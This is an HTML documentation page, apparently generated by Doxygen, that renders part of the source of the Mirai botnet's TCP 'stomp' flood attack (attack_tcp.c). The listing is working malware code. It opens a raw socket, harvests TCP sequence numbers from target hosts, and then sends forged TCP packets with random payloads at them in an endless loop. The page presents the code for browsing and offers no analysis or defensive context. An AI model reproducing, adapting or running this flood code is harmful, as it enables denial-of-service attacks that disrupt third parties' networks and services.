href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> data_rand = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00311"></a><span class="lineno">  311</span>&#160;</div><div class="line"><a name="l00312"></a><span class="lineno">  312</span>&#160;    <span class="comment">// Set up receive socket</span></div><div class="line"><a name="l00313"></a><span class="lineno">  313</span>&#160;    <span class="keywordflow">if</span> ((rfd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)</div><div class="line"><a name="l00314"></a><span class="lineno">  314</span>&#160;    {</div><div class="line"><a name="l00315"></a><span class="lineno">  315</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00316"></a><span class="lineno">  316</span>&#160;        printf(<span class="stringliteral">&quot;Could not open raw socket!\n&quot;</span>);</div><div class="line"><a name="l00317"></a><span class="lineno">  317</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00318"></a><span class="lineno">  318</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00319"></a><span class="lineno">  319</span>&#160;    }</div><div class="line"><a name="l00320"></a><span class="lineno">  320</span>&#160;    i = 1;</div><div class="line"><a name="l00321"></a><span class="lineno">  321</span>&#160;    <span class="keywordflow">if</span> (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00322"></a><span class="lineno">  322</span>&#160;    {</div><div class="line"><a name="l00323"></a><span class="lineno">  323</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00324"></a><span class="lineno">  324</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00325"></a><span class="lineno">  325</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00326"></a><span class="lineno">  326</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(rfd);</div><div class="line"><a name="l00327"></a><span class="lineno">  327</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00328"></a><span class="lineno">  328</span>&#160;    }</div><div class="line"><a name="l00329"></a><span class="lineno">  329</span>&#160;</div><div class="line"><a name="l00330"></a><span class="lineno">  330</span>&#160;    <span class="comment">// Retrieve all ACK/SEQ numbers</span></div><div class="line"><a name="l00331"></a><span class="lineno">  331</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00332"></a><span class="lineno">  332</span>&#160;    {</div><div class="line"><a name="l00333"></a><span class="lineno">  333</span>&#160;        <span class="keywordtype">int</span> fd;</div><div class="line"><a name="l00334"></a><span class="lineno">  334</span>&#160;        <span class="keyword">struct </span>sockaddr_in addr, recv_addr;</div><div class="line"><a name="l00335"></a><span class="lineno">  335</span>&#160;        socklen_t recv_addr_len;</div><div class="line"><a name="l00336"></a><span class="lineno">  336</span>&#160;        <span class="keywordtype">char</span> pktbuf[256];</div><div class="line"><a name="l00337"></a><span class="lineno">  337</span>&#160;        time_t start_recv;</div><div class="line"><a name="l00338"></a><span class="lineno">  338</span>&#160;</div><div class="line"><a name="l00339"></a><span class="lineno">  339</span>&#160;        stomp_setup_nums:</div><div class="line"><a name="l00340"></a><span class="lineno">  340</span>&#160;</div><div class="line"><a name="l00341"></a><span class="lineno">  341</span>&#160;        <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_STREAM, 0)) == -1)</div><div class="line"><a name="l00342"></a><span class="lineno">  342</span>&#160;        {</div><div class="line"><a name="l00343"></a><span class="lineno">  343</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00344"></a><span class="lineno">  344</span>&#160;            printf(<span class="stringliteral">&quot;Failed to create socket!\n&quot;</span>);</div><div class="line"><a name="l00345"></a><span class="lineno">  345</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00346"></a><span class="lineno">  346</span>&#160;            <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00347"></a><span class="lineno">  347</span>&#160;        }</div><div class="line"><a name="l00348"></a><span class="lineno">  348</span>&#160;</div><div class="line"><a name="l00349"></a><span class="lineno">  349</span>&#160;        <span class="comment">// Set it in nonblocking mode</span></div><div class="line"><a name="l00350"></a><span class="lineno">  350</span>&#160;        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);</div><div class="line"><a name="l00351"></a><span class="lineno">  351</span>&#160; </div><div class="line"><a name="l00352"></a><span class="lineno">  352</span>&#160;        <span class="comment">// Set up address to connect to</span></div><div class="line"><a name="l00353"></a><span class="lineno">  353</span>&#160;        addr.sin_family = AF_INET;</div><div class="line"><a name="l00354"></a><span class="lineno">  354</span>&#160;        <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00355"></a><span class="lineno">  355</span>&#160;            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00356"></a><span class="lineno">  356</span>&#160;        <span class="keywordflow">else</span></div><div class="line"><a name="l00357"></a><span class="lineno">  357</span>&#160;            addr.sin_addr.s_addr = targs[i].<a class="code" href="structattack__target.html#a431d4eed6dd4e7faddf9b8615b4d5c2a">addr</a>;</div><div class="line"><a name="l00358"></a><span class="lineno">  358</span>&#160;        <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00359"></a><span class="lineno">  359</span>&#160;            addr.sin_port = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00360"></a><span class="lineno">  360</span>&#160;        <span class="keywordflow">else</span></div><div class="line"><a name="l00361"></a><span class="lineno">  361</span>&#160;            addr.sin_port = htons(dport);</div><div class="line"><a name="l00362"></a><span class="lineno">  362</span>&#160;</div><div class="line"><a name="l00363"></a><span class="lineno">  363</span>&#160;        <span class="comment">// Actually connect, nonblocking</span></div><div class="line"><a name="l00364"></a><span class="lineno">  364</span>&#160;        <a class="code" href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a>(fd, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00365"></a><span class="lineno">  365</span>&#160;        start_recv = time(NULL);</div><div class="line"><a name="l00366"></a><span class="lineno">  366</span>&#160;</div><div class="line"><a name="l00367"></a><span class="lineno">  367</span>&#160;        <span class="comment">// Get info</span></div><div class="line"><a name="l00368"></a><span class="lineno">  368</span>&#160;        <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00369"></a><span class="lineno">  369</span>&#160;        {</div><div class="line"><a name="l00370"></a><span class="lineno">  370</span>&#160;            <span class="keywordtype">int</span> ret;</div><div class="line"><a name="l00371"></a><span class="lineno">  371</span>&#160;</div><div class="line"><a name="l00372"></a><span class="lineno">  372</span>&#160;            recv_addr_len = <span class="keyword">sizeof</span> (<span class="keyword">struct </span>sockaddr_in);</div><div class="line"><a name="l00373"></a><span class="lineno">  373</span>&#160;            ret = recvfrom(rfd, pktbuf, <span class="keyword">sizeof</span> (pktbuf), MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;recv_addr, &amp;recv_addr_len);</div><div class="line"><a name="l00374"></a><span class="lineno">  374</span>&#160;            <span class="keywordflow">if</span> (ret == -1)</div><div class="line"><a name="l00375"></a><span class="lineno">  375</span>&#160;            {</div><div class="line"><a name="l00376"></a><span class="lineno">  376</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00377"></a><span class="lineno">  377</span>&#160;                printf(<span class="stringliteral">&quot;Could not listen on raw socket!\n&quot;</span>);</div><div class="line"><a name="l00378"></a><span class="lineno">  378</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00379"></a><span class="lineno">  379</span>&#160;                <span class="keywordflow">return</span>;</div><div class="line"><a name="l00380"></a><span class="lineno">  380</span>&#160;            }</div><div class="line"><a name="l00381"></a><span class="lineno">  381</span>&#160;            <span class="keywordflow">if</span> (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr &amp;&amp; ret &gt; (sizeof (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr)))</div><div class="line"><a name="l00382"></a><span class="lineno">  382</span>&#160;            {</div><div class="line"><a name="l00383"></a><span class="lineno">  383</span>&#160;                <span class="keyword">struct </span>tcphdr *tcph = (<span class="keyword">struct </span>tcphdr *)(pktbuf + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00384"></a><span class="lineno">  384</span>&#160;</div><div class="line"><a name="l00385"></a><span class="lineno">  385</span>&#160;                <span class="keywordflow">if</span> (tcph-&gt;source == addr.sin_port)</div><div class="line"><a name="l00386"></a><span class="lineno">  386</span>&#160;                {</div><div class="line"><a name="l00387"></a><span class="lineno">  387</span>&#160;                    <span class="keywordflow">if</span> (tcph-&gt;syn &amp;&amp; tcph-&gt;ack)</div><div class="line"><a name="l00388"></a><span class="lineno">  388</span>&#160;                    {</div><div class="line"><a name="l00389"></a><span class="lineno">  389</span>&#160;                        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00390"></a><span class="lineno">  390</span>&#160;                        <span class="keyword">struct </span>tcphdr *tcph;</div><div class="line"><a name="l00391"></a><span class="lineno">  391</span>&#160;                        <span class="keywordtype">char</span> *payload;</div><div class="line"><a name="l00392"></a><span class="lineno">  392</span>&#160;</div><div class="line"><a name="l00393"></a><span class="lineno">  393</span>&#160;                        stomp_data[i].<a class="code" href="structattack__stomp__data.html#a8ca853bad73b883ccf12918fa8a6e462">addr</a> = addr.sin_addr.s_addr;</div><div class="line"><a name="l00394"></a><span class="lineno">  394</span>&#160;                        stomp_data[i].<a class="code" href="structattack__stomp__data.html#ae85fad7e9f54f0d34c2bc226197497ef">seq</a> = ntohl(tcph-&gt;seq);</div><div class="line"><a name="l00395"></a><span class="lineno">  395</span>&#160;                        stomp_data[i].<a class="code" href="structattack__stomp__data.html#a22c599d05ab7da049cd9b5a4757e3220">ack_seq</a> = ntohl(tcph-&gt;ack_seq);</div><div class="line"><a name="l00396"></a><span class="lineno">  396</span>&#160;                        stomp_data[i].<a class="code" href="structattack__stomp__data.html#a3dec28f563364d02b0c29ae84c58a308">sport</a> = tcph-&gt;dest;</div><div class="line"><a name="l00397"></a><span class="lineno">  397</span>&#160;                        stomp_data[i].<a class="code" href="structattack__stomp__data.html#a72bb4223d67736e2972679840a79c72e">dport</a> = addr.sin_port;</div><div class="line"><a name="l00398"></a><span class="lineno">  398</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00399"></a><span class="lineno">  399</span>&#160;                        printf(<span class="stringliteral">&quot;ACK Stomp got SYN+ACK!\n&quot;</span>);</div><div class="line"><a name="l00400"></a><span class="lineno">  400</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00401"></a><span class="lineno">  401</span>&#160;                        <span class="comment">// Set up the packet</span></div><div class="line"><a name="l00402"></a><span class="lineno">  402</span>&#160;                        pkts[i] = malloc(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len);</div><div class="line"><a name="l00403"></a><span class="lineno">  403</span>&#160;                        iph = (<span class="keyword">struct </span>iphdr *)pkts[i];</div><div class="line"><a name="l00404"></a><span class="lineno">  404</span>&#160;                        tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00405"></a><span class="lineno">  405</span>&#160;                        payload = (<span class="keywordtype">char</span> *)(tcph + 1);</div><div class="line"><a name="l00406"></a><span class="lineno">  406</span>&#160;</div><div class="line"><a name="l00407"></a><span class="lineno">  407</span>&#160;                        iph-&gt;version = 4;</div><div class="line"><a name="l00408"></a><span class="lineno">  408</span>&#160;                        iph-&gt;ihl = 5;</div><div class="line"><a name="l00409"></a><span class="lineno">  409</span>&#160;                        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00410"></a><span class="lineno">  410</span>&#160;                        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len);</div><div class="line"><a name="l00411"></a><span class="lineno">  411</span>&#160;                        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00412"></a><span class="lineno">  412</span>&#160;                        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00413"></a><span class="lineno">  413</span>&#160;                        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00414"></a><span class="lineno">  414</span>&#160;                            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00415"></a><span class="lineno">  415</span>&#160;                        iph-&gt;protocol = IPPROTO_TCP;</div><div class="line"><a name="l00416"></a><span class="lineno">  416</span>&#160;                        iph-&gt;saddr = <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>;</div><div class="line"><a name="l00417"></a><span class="lineno">  417</span>&#160;                        iph-&gt;daddr = stomp_data[i].<a class="code" href="structattack__stomp__data.html#a8ca853bad73b883ccf12918fa8a6e462">addr</a>;</div><div class="line"><a name="l00418"></a><span class="lineno">  418</span>&#160;</div><div class="line"><a name="l00419"></a><span class="lineno">  419</span>&#160;                        tcph-&gt;source = stomp_data[i].<a class="code" href="structattack__stomp__data.html#a3dec28f563364d02b0c29ae84c58a308">sport</a>;</div><div class="line"><a name="l00420"></a><span class="lineno">  420</span>&#160;                        tcph-&gt;dest = stomp_data[i].<a class="code" href="structattack__stomp__data.html#a72bb4223d67736e2972679840a79c72e">dport</a>;</div><div class="line"><a name="l00421"></a><span class="lineno">  421</span>&#160;                        tcph-&gt;seq = stomp_data[i].<a class="code" href="structattack__stomp__data.html#a22c599d05ab7da049cd9b5a4757e3220">ack_seq</a>;</div><div class="line"><a name="l00422"></a><span class="lineno">  422</span>&#160;                        tcph-&gt;ack_seq = stomp_data[i].<a class="code" href="structattack__stomp__data.html#ae85fad7e9f54f0d34c2bc226197497ef">seq</a>;</div><div class="line"><a name="l00423"></a><span class="lineno">  423</span>&#160;                        tcph-&gt;doff = 8;</div><div class="line"><a name="l00424"></a><span class="lineno">  424</span>&#160;                        tcph-&gt;fin = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00425"></a><span class="lineno">  425</span>&#160;                        tcph-&gt;ack = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00426"></a><span class="lineno">  426</span>&#160;                        tcph-&gt;window = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00427"></a><span class="lineno">  427</span>&#160;                        tcph-&gt;urg = urg_fl;</div><div class="line"><a name="l00428"></a><span class="lineno">  428</span>&#160;                        tcph-&gt;ack = ack_fl;</div><div class="line"><a name="l00429"></a><span class="lineno">  429</span>&#160;                        tcph-&gt;psh = psh_fl;</div><div class="line"><a name="l00430"></a><span class="lineno">  430</span>&#160;                        tcph-&gt;rst = rst_fl;</div><div class="line"><a name="l00431"></a><span class="lineno">  431</span>&#160;                        tcph-&gt;syn = syn_fl;</div><div class="line"><a name="l00432"></a><span class="lineno">  432</span>&#160;                        tcph-&gt;fin = fin_fl;</div><div class="line"><a name="l00433"></a><span class="lineno">  433</span>&#160;</div><div class="line"><a name="l00434"></a><span class="lineno">  434</span>&#160;                        <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(payload, data_len);</div><div class="line"><a name="l00435"></a><span class="lineno">  435</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00436"></a><span class="lineno">  436</span>&#160;                    }</div><div class="line"><a name="l00437"></a><span class="lineno">  437</span>&#160;                    <span class="keywordflow">else</span> <span class="keywordflow">if</span> (tcph-&gt;fin || tcph-&gt;rst)</div><div class="line"><a name="l00438"></a><span class="lineno">  438</span>&#160;                    {</div><div class="line"><a name="l00439"></a><span class="lineno">  439</span>&#160;                        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00440"></a><span class="lineno">  440</span>&#160;                        <span class="keywordflow">goto</span> stomp_setup_nums;</div><div class="line"><a name="l00441"></a><span class="lineno">  441</span>&#160;                    }</div><div class="line"><a name="l00442"></a><span class="lineno">  442</span>&#160;                }</div><div class="line"><a name="l00443"></a><span class="lineno">  443</span>&#160;            }</div><div class="line"><a name="l00444"></a><span class="lineno">  444</span>&#160;</div><div class="line"><a name="l00445"></a><span class="lineno">  445</span>&#160;            <span class="keywordflow">if</span> (time(NULL) - start_recv &gt; 10)</div><div class="line"><a name="l00446"></a><span class="lineno">  446</span>&#160;            {</div><div class="line"><a name="l00447"></a><span class="lineno">  447</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00448"></a><span class="lineno">  448</span>&#160;                printf(<span class="stringliteral">&quot;Couldn&#39;t connect to host for ACK Stomp in time. Retrying\n&quot;</span>);</div><div class="line"><a name="l00449"></a><span class="lineno">  449</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00450"></a><span class="lineno">  450</span>&#160;                <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00451"></a><span class="lineno">  451</span>&#160;                <span class="keywordflow">goto</span> stomp_setup_nums;</div><div class="line"><a name="l00452"></a><span class="lineno">  452</span>&#160;            }</div><div class="line"><a name="l00453"></a><span class="lineno">  453</span>&#160;        }</div><div class="line"><a name="l00454"></a><span class="lineno">  454</span>&#160;    }</div><div class="line"><a name="l00455"></a><span class="lineno">  455</span>&#160;</div><div class="line"><a name="l00456"></a><span class="lineno">  456</span>&#160;    <span class="comment">// Start spewing out traffic</span></div><div class="line"><a name="l00457"></a><span class="lineno">  457</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00458"></a><span class="lineno">  458</span>&#160;    {</div><div class="line"><a name="l00459"></a><span class="lineno">  459</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00460"></a><span class="lineno">  460</span>&#160;        {</div><div class="line"><a name="l00461"></a><span class="lineno">  461</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00462"></a><span class="lineno">  462</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00463"></a><span class="lineno">  463</span>&#160;            <span class="keyword">struct </span>tcphdr *tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00464"></a><span class="lineno">  464</span>&#160;            <span class="keywordtype">char</span> *data = (<span class="keywordtype">char</span> *)(tcph + 1);</div><div class="line"><a name="l00465"></a><span class="lineno">  465</span>&#160;</div><div class="line"><a name="l00466"></a><span class="lineno">  466</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00467"></a><span class="lineno">  467</span>&#160;                iph-&gt;id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00468"></a><span class="lineno">  468</span>&#160;</div><div class="line"><a name="l00469"></a><span class="lineno">  469</span>&#160;            <span class="keywordflow">if</span> (data_rand)</div><div class="line"><a name="l00470"></a><span class="lineno">  470</span>&#160;                <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(data, data_len);</div><div class="line"><a name="l00471"></a><span class="lineno">  471</span>&#160;</div><div class="line"><a name="l00472"></a><span class="lineno">  472</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00473"></a><span class="lineno">  473</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00474"></a><span class="lineno">  474</span>&#160;</div><div class="line"><a name="l00475"></a><span class="lineno">  475</span>&#160;            tcph-&gt;seq = htons(stomp_data[i].seq++);</div><div class="line"><a name="l00476"></a><span class="lineno">  476</span>&#160;            tcph-&gt;ack_seq = htons(stomp_data[i].ack_seq);</div><div class="line"><a name="l00477"></a><span class="lineno">  477</span>&#160;            tcph-&gt;check = 0;</div><div class="line"><a name="l00478"></a><span class="lineno">  478</span>&#160;            tcph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(iph, tcph, htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len), <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len);</div><div class="line"><a name="l00479"></a><span class="lineno">  479</span>&#160;</div><div class="line"><a name="l00480"></a><span class="lineno">  480</span>&#160;            targs[i].<a class="code" href="structattack__target.html#a8f537c8c1aa7f2b611c6de392d964dfc">sock_addr</a>.sin_port = tcph-&gt;dest;</div><div class="line"><a name="l00481"></a><span class="lineno">  481</span>&#160;            sendto(rfd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len, MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00482"></a><span class="lineno">  482</span>&#160;        }</div><div class="line"><a name="l00483"></a><span class="lineno">  483</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00484"></a><span class="lineno">  484</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00485"></a><span class="lineno">  485</span>&#160;            <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00486"></a><span class="lineno">  486</span>&#160;                printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00487"></a><span class="lineno">  487</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00488"></a><span class="lineno">  488</span>&#160;    }</div><div class="line"><a name="l00489"></a><span class="lineno">  489</span>&#160;}</div><div class="ttc" id="attack__tcp_8c_html_a6576962e0ea664ef81c0e70e79a07e0b"><div class="ttname"><a href="attack__tcp_8c.html#a6576962e0ea664ef81c0e70e79a07e0b">attack_tcp_stomp</a></div><div class="ttdeci">void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)</div><div class="ttdef"><b>Definition:</b> <a href="attack__tcp_8c_source.html#l00293">attack_tcp.c:293</a></div></div>
<div class="ttc" id="structattack__stomp__data_html_ae85fad7e9f54f0d34c2bc226197497ef"><div class="ttname"><a href="structattack__stomp__data.html#ae85fad7e9f54f0d34c2bc226197497ef">attack_stomp_data::seq</a></div><div class="ttdeci">uint32_t seq</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00080">attack.h:80</a></div></div>
<div class="ttc" id="structattack__target_html_a431d4eed6dd4e7faddf9b8615b4d5c2a"><div class="ttname"><a href="structattack__target.html#a431d4eed6dd4e7faddf9b8615b4d5c2a">attack_target::addr</a></div><div class="ttdeci">ipv4_t addr</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00022">attack.h:22</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="checksum_8c_html_a84522f5e663ea711a5ceafdf03e586ea"><div class="ttname"><a href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a></div><div class="ttdeci">uint16_t checksum_generic(uint16_t *addr, uint32_t count)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00009">checksum.c:9</a></div></div>
<div class="ttc" id="attack_8h_html_a4f086d53d4494633a898fbd9886b08bf"><div class="ttname"><a href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a></div><div class="ttdeci">#define ATK_OPT_SYN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00061">attack.h:61</a></div></div>
<div class="ttc" id="structattack__option_html"><div class="ttname"><a href="structattack__option.html">attack_option</a></div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00026">attack.h:26</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="protocol_8h_html_a8922d59dda5c9af3f4d0dd3ac311846d"><div class="ttname"><a href="protocol_8h.html#a8922d59dda5c9af3f4d0dd3ac311846d">PROTO_TCP_OPT_TSVAL</a></div><div class="ttdeci">#define PROTO_TCP_OPT_TSVAL</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00032">protocol.h:32</a></div></div>
<div class="ttc" id="attack_8h_html_acfa2ed8a557040aed04b6c9346aa0eb9"><div class="ttname"><a href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a></div><div class="ttdeci">#define ATK_OPT_IP_TTL</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00050">attack.h:50</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_aecb64c7238a325af454cf5e17d933ff2"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a></div><div class="ttdeci">ipv4_t LOCAL_ADDR</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00031">includes.h:31</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="structattack__stomp__data_html_a8ca853bad73b883ccf12918fa8a6e462"><div class="ttname"><a href="structattack__stomp__data.html#a8ca853bad73b883ccf12918fa8a6e462">attack_stomp_data::addr</a></div><div class="ttdeci">ipv4_t addr</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00079">attack.h:79</a></div></div>
<div class="ttc" id="protocol_8h_html_a0ac41cedcfd51c915345550521966281"><div class="ttname"><a href="protocol_8h.html#a0ac41cedcfd51c915345550521966281">PROTO_TCP_OPT_MSS</a></div><div class="ttdeci">#define PROTO_TCP_OPT_MSS</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00029">protocol.h:29</a></div></div>
<div class="ttc" id="rand_8h_html"><div class="ttname"><a href="rand_8h.html">rand.h</a></div></div>
<div class="ttc" id="attack__tcp_8c_html_a1195433a4eb190cddc7d0b7643bb3a9b"><div class="ttname"><a href="attack__tcp_8c.html#a1195433a4eb190cddc7d0b7643bb3a9b">attack_tcp_ack</a></div><div class="ttdeci">void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)</div><div class="ttdef"><b>Definition:</b> <a href="attack__tcp_8c_source.html#l00161">attack_tcp.c:161</a></div></div>
